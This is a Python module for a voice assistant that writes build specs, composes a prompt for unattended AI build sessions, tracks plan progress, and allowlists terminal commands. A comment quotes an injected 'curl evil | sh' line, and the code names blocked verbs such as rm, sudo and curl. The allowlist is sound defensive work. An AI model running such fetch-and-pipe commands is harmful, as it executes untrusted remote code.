"""Real builds: the spec that survives, the brief that drives, the plan that reports.

A `spawn_run` is one sentence handed to one unattended turn. That is the right
shape for "fix the typo in the footer" and the wrong shape for a project. The
user put it plainly: *"these like unattended runs where you can only give it
one thing and it just spits out a result isn't really what we want for complex
projects"* — real work is **detailed planning, a written spec, revision of that
spec, and then phased execution**, and the review cycles are where the quality
comes from.

Three things live here, and nothing else. No server imports, no asyncio, no
`claude` subprocess: `server.py` calls all of it, the filesystem parts through
`asyncio.to_thread`.

1. **The spec, written into the project.** `docs/superpowers/specs/` is where
   a project's designs live, and the spec is the only artifact that
   survives the thing that kills long builds — a compaction, a session
   replacement, JARVIS's own context rotation. What the user agreed by voice
   goes on disk *before* anything is spawned.

2. **The brief.** The whole process, handed over in one prompt: read the
   settled spec, write a phased plan, *review and revise that plan against the
   spec*, then execute it task by task under test-driven development, ticking
   the plan's checkboxes as it goes. `superpowers:brainstorming` has a hard
   human-approval gate — an earlier run obeyed it, asked one question, exited
   zero and built nothing — so the brief names that gate and shuts it, while
   sending the session to every skill AFTER it.

3. **Progress, read off the plan file.** A plan is machine-readable
   (`## Task N: title`, `- [ ]` / `- [x]`), so "how far has it got" has a real
   answer instead of a guess from the run's age.

Plus one guard: `command_problem`, which bounds what `run_command` is allowed
to put into a Terminal window. That text came out of a microphone and through
an LLM, so it is treated as such.
"""

from __future__ import annotations

import datetime
import json
import re
from pathlib import Path

# Where a build's artifacts live inside the project it is building. This
# layout is the superpowers convention, deliberately: those skills read and
# write these directories by name, and a human opening the project finds the
# design where designs go.
SPEC_DIR = "docs/superpowers/specs"
PLAN_DIR = "docs/superpowers/plans"

# A spoken topic becomes a filename, so it is slugified hard and bounded.
_SLUG_MAX = 60


def _slug(text: str) -> str:
    slug = re.sub(r"[^a-z0-9]+", "-", (text or "").lower()).strip("-")
    if len(slug) > _SLUG_MAX:
        slug = slug[:_SLUG_MAX].rstrip("-")
    return slug or "build"


# Words a title picks up that say nothing about the topic. "A local web UI to
# browse and edit CLAUDE.md files — Design" is filed under the topic, not
# under the word "design".
_TITLE_TAIL = re.compile(
    r"[\s\-—:]*(design|spec|specification|design doc|design document)\s*$",
    re.IGNORECASE)


def topic_of(spec: str) -> str:
    """The topic a spec is about, for its filename.

    Reads the first markdown heading if there is one, otherwise the first
    line. Nothing else in the document is consulted: the brain writes the
    title, and guessing a topic out of the body would be guessing.
    """
    for raw in (spec or "").splitlines():
        line = raw.strip()
        if not line:
            continue
        line = line.lstrip("#").strip()
        if not line:
            continue
        return _TITLE_TAIL.sub("", line).strip() or line
    return "build"


def spec_path(spec: str, today: datetime.date | None = None) -> str:
    """The project-relative path this spec is written to.

    `docs/superpowers/specs/YYYY-MM-DD-<topic>-design.md`, matching the
    convention already in use.
    """
    day = (today or datetime.date.today()).isoformat()
    return f"{SPEC_DIR}/{day}-{_slug(topic_of(spec))}-design.md"


def render_spec(spec: str, constraints: str = "", non_goals: str = "",
                today: datetime.date | None = None) -> str:
    """The document written to disk.

    The header is not decoration. "Status: Approved" is the sentence the
    session is told to trust when the brief says do not re-open the design,
    and the date is what makes two specs in one project tellable apart.
    """
    day = (today or datetime.date.today()).isoformat()
    body = (spec or "").strip()
    lines = [f"# {topic_of(spec)} — Design",
             "",
             f"Date: {day}",
             "Status: Approved — settled with the user by voice, before the "
             "build was started.",
             "",
             "> Written by Auvren from the conversation in which this was "
             "agreed. It is the build's source of truth: it outlives the "
             "session that reads it, and a session that has compacted or been "
             "replaced starts again from here.",
             "",
             "## What we agreed",
             "",
             body,
             ""]
    if (constraints or "").strip():
        lines += ["## Constraints", "", constraints.strip(), ""]
    if (non_goals or "").strip():
        lines += ["## Non-goals", "", non_goals.strip(), ""]
    return "\n".join(lines)


def write_spec(project_path: str, spec: str, constraints: str = "",
               non_goals: str = "", today: datetime.date | None = None) -> str:
    """Write the spec into the project. Returns its project-relative path.

    Blocking; call it off the voice loop. It creates the two superpowers
    directories if they are not there, because a fresh project from
    `create_project` has neither, and the brief points at both.
    """
    relative = spec_path(spec, today)
    root = Path(project_path)
    target = root / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    (root / PLAN_DIR).mkdir(parents=True, exist_ok=True)
    target.write_text(render_spec(spec, constraints, non_goals, today),
                      encoding="utf-8")
    return relative


# --- The brief -----------------------------------------------------------
#
# Everything a session needs to run a real project alone. Read it as a whole:
# each paragraph is load-bearing and was put there by something that went
# wrong without it.
#
#   * The operating condition comes FIRST, and states that no answer can
#     arrive — not that the session should "be autonomous". A vague
#     instruction was never going to beat `superpowers:brainstorming`'s
#     explicit "do NOT write any code until the user has approved a design".
#   * The approval gate is named and shut, and the reason is given: the design
#     is already approved, in a file, by a human, out loud.
#   * Planning, self-review, execution, TDD and verification are numbered
#     steps, not adjectives. "Review and revise your own plan" is step 2 of 6
#     and comes before any code, because that is the user's whole thesis:
#     *"the more models get feedback and review and revise their own
#     specs/planning, the better the result is."*
#   * Ticking the checkboxes is an instruction, because it is the only channel
#     through which `build_status` can say anything true.
#   * "Decide it and write the decision down" closes the last exit: a
#     long-running session WILL meet a question the spec does not answer, and
#     the failure mode is stopping to ask one nobody will read.
#   * The product bar is named explicitly, because the last project this drove
#     failed on exactly this: a pop-up asking the user to type in scan paths,
#     with no way out of it, and a README the user asked to have replaced with
#     "a simple command". Zero-config first launch, no undismissable modal, a
#     one-command README, and a UI that is not an afterthought are stated as
#     requirements the session verifies before it reports done, not left as
#     things a careful builder would probably do anyway.

BUILD_BRIEF_TEMPLATE = """\
[Long build — no human present] You are building a real project from a settled \
design, start to finish, in one long session. Nobody is watching this and \
nobody can answer a question: no reply can ever reach you, so ending your turn \
to ask something means the work simply never happens. There is no time limit. \
Take as long as the work honestly needs.

THE DESIGN IS SETTLED AND APPROVED. The user agreed it out loud and it is \
written down in this project at:

    {spec_path}

Read that file before anything else. Do NOT brainstorm, do NOT re-open the \
design, do NOT present a plan, a design or a set of options for approval, and \
do NOT invoke any skill that requires a human to approve something before you \
implement — superpowers:brainstorming in particular carries a hard approval \
gate, and that approval has already been given, in the file above. Treat the \
spec as the requirement it is: build what it says, and where it is silent, see \
step 6.

Then run the whole process yourself, in this order.

1. PLAN. Use superpowers:writing-plans to write a phased implementation plan \
into {plan_dir}/ before you touch any code. Give every task a `## Task N: \
<title>` heading and break it into `- [ ]` checkbox steps, each one small \
enough to finish and verify on its own.

2. REVIEW AND REVISE YOUR OWN PLAN, before you execute a line of it. Read the \
plan back against the spec and hunt for what is wrong with it: requirements in \
the spec that no task covers, tasks that contradict each other or the spec, \
steps left vague or holding a placeholder, ordering that would have you build \
on something that does not exist yet, and anything a reader could not execute \
without asking a question. Fix all of it in the plan file. Do this at least \
once and again whenever the plan stops matching reality — the revision is \
where the quality comes from, not the first draft.

3. EXECUTE with superpowers:subagent-driven-development, one task at a time: a \
fresh implementer subagent for each task, then a reviewer subagent over its \
work before you move on. Use superpowers:executing-plans instead only if the \
tasks are so entangled that handing one to a fresh subagent would cost more \
context than it saves. Say in one line which you chose and why, then start.

4. TEST-DRIVE EVERYTHING. Use superpowers:test-driven-development for every \
task — the failing test first, then the code that passes it. Before you call \
any task or the build done, use superpowers:verification-before-completion: \
run the tests, read the actual output, and never report work as finished on \
the strength of having written it. If something breaks, use \
superpowers:systematic-debugging rather than guessing at a fix.

5. TICK THE CHECKBOXES AS YOU GO. The moment a step is done and verified, edit \
the plan file and change its `- [ ]` to `- [x]`. That file is the only way the \
user can see how far you have got, so keep it current and keep it honest: \
never tick a box for work that is not finished and not verified.

6. NOBODY CAN ANSWER A QUESTION. Where the spec leaves a choice open, decide it \
yourself on the merits, write the decision and your reason into the plan file \
under the task it belongs to, and carry on. A question at the end of your turn \
builds nothing.

7. THE BAR THIS SHIP HAS TO CLEAR. The last project like this one failed on \
first launch: it opened with a pop-up demanding the user type in scan paths, \
with no way to dismiss it, and a README so complex the user asked whether \
there was "a simple command" instead. Do not repeat that. It must work on \
first launch with zero configuration — where you need to know something \
about the machine, find it out yourself; never open with a form or a prompt \
asking the user to type it in. No modal or dialog the user cannot dismiss or \
get past. The README's happy path is one command, not a checklist. The UI is \
not an afterthought bolted on last — it is part of what you are building and \
is held to the same bar as the logic underneath it. Before you report the \
build done, actually run what you built exactly as a first-time user would, \
starting from nothing configured, and confirm every one of those holds.

Commit as you go, one commit per completed task, and never push. When the last \
task is ticked and the tests pass, stop and say what you built.\
"""


def compose_build_brief(spec_relative_path: str) -> str:
    """The prompt a build is actually given.

    Takes the spec's path rather than its text on purpose: the file is the
    durable artifact, and a session that has compacted can re-read it, while
    a prompt it can no longer see helps nobody.
    """
    return BUILD_BRIEF_TEMPLATE.format(spec_path=spec_relative_path,
                                       plan_dir=PLAN_DIR)


# `user_prompt_of` in server.py strips the framing off a stored prompt so a
# run can be gisted out loud. A build's prompt is framing to its last line, so
# its gist comes from the spec path instead.
BUILD_BRIEF_HEAD = "[Long build — no human present]"


def is_build_prompt(stored_prompt: str) -> bool:
    return (stored_prompt or "").startswith(BUILD_BRIEF_HEAD)


# --- Progress, read off the plan -----------------------------------------

# `## Task N: title` is what the brief asks for; `###` is what several of
# this repository's own plans actually use, so both are read.
# `str.splitlines()` splits on TEN characters; a regex `.` excludes only
# "\n" of them, and `\s` MATCHES all ten. So a line-oriented pattern written
# with `.` and `\s` still accepts nine separators — which is the same defect
# as the `$` above, one layer down. This class is "any character that is not
# one of the ten", and tests/test_anchored_patterns.py checks the list
# against `str.splitlines()` itself rather than trusting it.
_ON_ONE_LINE = r"[^\r\n\v\f\x1c\x1d\x1e\x85\u2028\u2029]"

_TASK_HEADING = re.compile(
    rf"#{{2,4}}[ \t]+Task[ \t]+(\d+)[ \t]*[:.\-—][ \t]*"
    rf"({_ON_ONE_LINE}+?)[ \t]*")
_CHECKBOX = re.compile(
    rf"[ \t]*[-*][ \t]+\[([ xX])\][ \t]*({_ON_ONE_LINE}*?)[ \t]*")

# Strip the bold/emphasis a plan's steps are written with, so a spoken step
# is not read out as "star star Step 1 star star".
_EMPHASIS = re.compile(r"[*_`]+")


class PlanTask:
    __slots__ = ("number", "title", "steps_done", "steps_total")

    def __init__(self, number: int, title: str):
        self.number = number
        self.title = title
        self.steps_done = 0
        self.steps_total = 0

    @property
    def done(self) -> bool:
        """A task is done when it HAS steps and every one is ticked.

        A task with no checkbox steps is never counted done: claiming a build
        finished because a heading had nothing under it is exactly the class
        of lie the run pipeline exists to prevent.
        """
        return self.steps_total > 0 and self.steps_done == self.steps_total

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return f"<Task {self.number} {self.title!r} {self.steps_done}/{self.steps_total}>"


def task_number_of(heading: str) -> int:
    """The N in a `Task N: title` heading, or 0 if it is not one.

    Exposed so the review surface can line a plan's own task numbers up with
    the section numbers it shows the user, without a second regex that could
    drift from this one.
    """
    match = _TASK_HEADING.fullmatch(f"## {(heading or '').strip()}")
    return int(match.group(1)) if match else 0


def parse_plan(text: str) -> list[PlanTask]:
    """The tasks in a plan, and how many of each one's steps are ticked.

    Verified against this repository's own plans. Checkboxes above the first
    task heading (a preamble checklist) belong to no task and are ignored.
    """
    tasks: list[PlanTask] = []
    current: PlanTask | None = None
    for line in (text or "").splitlines():
        heading = _TASK_HEADING.fullmatch(line)
        if heading:
            current = PlanTask(int(heading.group(1)),
                               _EMPHASIS.sub("", heading.group(2)).strip())
            tasks.append(current)
            continue
        box = _CHECKBOX.fullmatch(line)
        if box and current is not None:
            current.steps_total += 1
            if box.group(1) in ("x", "X"):
                current.steps_done += 1
    return tasks


def latest_plan(project_path: str) -> Path | None:
    """The plan file a build is working from: the most recently MODIFIED one.

    Modification time, not the date in the filename — the session edits the
    plan every time it ticks a box, so the file being worked on is the file
    that just changed. A project with several milestones' plans in it would
    otherwise report progress against whichever was named latest.
    """
    directory = Path(project_path) / PLAN_DIR
    try:
        plans = [p for p in directory.glob("*.md") if p.is_file()]
    except OSError:
        return None
    if not plans:
        return None
    return max(plans, key=lambda p: p.stat().st_mtime)


class PlanProgress:
    __slots__ = ("path", "tasks")

    def __init__(self, path: Path, tasks: list[PlanTask]):
        self.path = path
        self.tasks = tasks

    @property
    def total(self) -> int:
        return len(self.tasks)

    @property
    def done(self) -> int:
        return sum(1 for t in self.tasks if t.done)

    @property
    def current(self) -> PlanTask | None:
        """The first task that is not finished — what it is working on now."""
        return next((t for t in self.tasks if not t.done), None)

    @property
    def finished(self) -> bool:
        return self.total > 0 and self.done == self.total


def plan_progress(project_path: str) -> PlanProgress | None:
    """Progress against the project's newest plan, or None if there isn't one.

    None means "no plan file", which the caller must say as *still planning*
    rather than as no progress: the first thing a build does is write one, and
    that takes a while.
    """
    path = latest_plan(project_path)
    if path is None:
        return None
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    tasks = parse_plan(text)
    if not tasks:
        return None
    return PlanProgress(path, tasks)


# --- What may be typed into a Terminal window ----------------------------
#
# `run_command` exists because the user hit a wall — "can you actually just do
# the processes for me so I can see it in the browser" — and JARVIS had to say
# no. It runs a command in a VISIBLE Terminal window in the project directory,
# after reading it back and opening a cancel window, exactly like a steer.
#
# The read-back is the real gate: the user hears the command before it runs.
# Everything below is the second gate, and it is deliberately narrow, because
# the string arrives from an LLM that has been reading other people's READMEs:
#
#   * a character allowlist, so there is no shell to compose with at all — no
#     `;`, no `&&`, no pipe, no redirect, no backtick, no `$(…)`, no newline.
#     One command, its flags and its arguments, and nothing else;
#   * a first-token allowlist of things that START a project, or a path to a
#     file that actually exists inside the project (`.venv/bin/python`,
#     `./run.sh`). `rm`, `sudo`, `curl`, `ssh` and every other verb are not on
#     it and cannot be reached by any spelling;
#   * a length cap, because it has to be spoken aloud before it runs.
#
# Whether the project itself DOCUMENTS the command is a separate question,
# answered by `is_documented` and said out loud rather than enforced: "it's
# the start command in its README" and "I don't see it documented" are
# different sentences, and the user is the one who decides.

COMMAND_MAX_CHARS = 160

# No shell metacharacter is in this set. That is the point: what cannot be
# spelled cannot be chained, substituted, redirected or backgrounded.
# No `$`, and used with `fullmatch`: `$` matches before a trailing newline,
# so `.match()` accepted "npm start\ncurl evil | sh" — and a newline chains a
# command just as well as the semicolon this allowlist exists to forbid.
_COMMAND_ALLOWED = re.compile(r"[A-Za-z0-9 _\-./:=,+@]+")

# Things that start a project. Verbs that change a machine are absent, and
# absent on purpose — this list is the allowlist, not a starting point.
_LAUNCHERS = frozenset({
    "npm", "pnpm", "yarn", "bun", "npx", "node", "deno",
    "python", "python3", "uv", "uvicorn", "gunicorn", "flask", "streamlit",
    "make", "cargo", "go", "ruby", "rails", "bundle", "php", "dotnet",
    "hugo", "jekyll", "vite", "next", "serve", "http-server",
})


def _first_token(command: str) -> str:
    return command.strip().split(" ", 1)[0] if command.strip() else ""


def command_problem(command: str, project_path: str) -> str | None:
    """None if this may be run, or the sentence JARVIS should say instead.

    Refusals are spoken, so each one says what is wrong in a clause a person
    can act on — never "invalid input".
    """
    text = (command or "").strip()
    if not text:
        return "There was nothing to run."
    if len(text) > COMMAND_MAX_CHARS:
        return ("That command is too long to read back to you, sir — give me "
                "the short one the project actually starts with.")
    if not _COMMAND_ALLOWED.fullmatch(text):
        return ("I'll only run a single plain command, sir — no pipes, no "
                "semicolons, nothing chained together.")

    token = _first_token(text)
    if token in _LAUNCHERS:
        return None

    # A path INSIDE the project that really exists: `.venv/bin/python`,
    # `./scripts/dev.sh`. Containment is proved by resolving, not by looking
    # at the string — `../../` resolves out and is refused here.
    if "/" in token:
        root = Path(project_path).resolve()
        try:
            candidate = (root / token).resolve()
            if candidate.is_file() and candidate.is_relative_to(root):
                return None
        except OSError:
            pass
        return (f"There's no {token} in that project, sir, so I've run "
                f"nothing.")

    return (f"I don't start things with {token}, sir — I'll run the command "
            f"the project documents, and nothing else.")


def _package_scripts(project_path: str) -> set[str]:
    try:
        raw = (Path(project_path) / "package.json").read_text(
            encoding="utf-8", errors="replace")
        scripts = json.loads(raw).get("scripts")
    except (OSError, ValueError, AttributeError):
        return set()
    return set(scripts) if isinstance(scripts, dict) else set()


_README_BYTES = 60_000


def is_documented(command: str, project_path: str) -> bool:
    """Whether the project itself says to run this.

    Three sources, all of them the project's own words: its README, its
    package.json scripts, its Makefile targets. Used to colour what JARVIS
    says before he runs it, never to refuse — a project with no README is not
    a suspicious project.
    """
    text = " ".join((command or "").split())
    if not text:
        return False
    root = Path(project_path)

    for name in ("README.md", "README", "readme.md", "Readme.md", "README.txt"):
        try:
            body = (root / name).read_text(encoding="utf-8",
                                           errors="replace")[:_README_BYTES]
        except OSError:
            continue
        if text.lower() in " ".join(body.split()).lower():
            return True

    parts = text.split()
    scripts = _package_scripts(project_path)
    if scripts:
        if len(parts) >= 3 and parts[0] in ("npm", "pnpm", "bun") \
                and parts[1] == "run" and parts[2] in scripts:
            return True
        if len(parts) >= 2 and parts[0] == "yarn" and parts[1] in scripts:
            return True
        if len(parts) >= 2 and parts[0] in ("npm", "pnpm", "bun", "yarn") \
                and parts[1] in ("start", "dev", "test", "build") \
                and parts[1] in scripts:
            return True

    if len(parts) >= 2 and parts[0] == "make":
        for name in ("Makefile", "makefile", "GNUmakefile"):
            try:
                body = (root / name).read_text(encoding="utf-8",
                                               errors="replace")
            except OSError:
                continue
            if re.search(rf"^{re.escape(parts[1])}\s*:", body, re.MULTILINE):
                return True
    return False


# The spec path the brief points at, recovered from a stored build prompt.
_SPEC_LINE = re.compile(rf"^\s*({re.escape(SPEC_DIR)}/\S+\.md)\s*$", re.MULTILINE)


def gist_of_build(stored_prompt: str) -> str:
    """A few words a person could hear, for a run whose prompt is all framing.

    `_run_gist` reads the head of a run's prompt so two runs in one project
    can be told apart out loud. A build's prompt begins with three lines of
    operating conditions, so the topic is recovered from the spec filename
    instead — which is exactly the topic the user named.
    """
    match = _SPEC_LINE.search(stored_prompt or "")
    if not match:
        return ""
    stem = Path(match.group(1)).stem            # YYYY-MM-DD-topic-design
    stem = re.sub(r"^\d{4}-\d{2}-\d{2}-", "", stem)
    stem = re.sub(r"-design$", "", stem)
    return stem.replace("-", " ").strip()
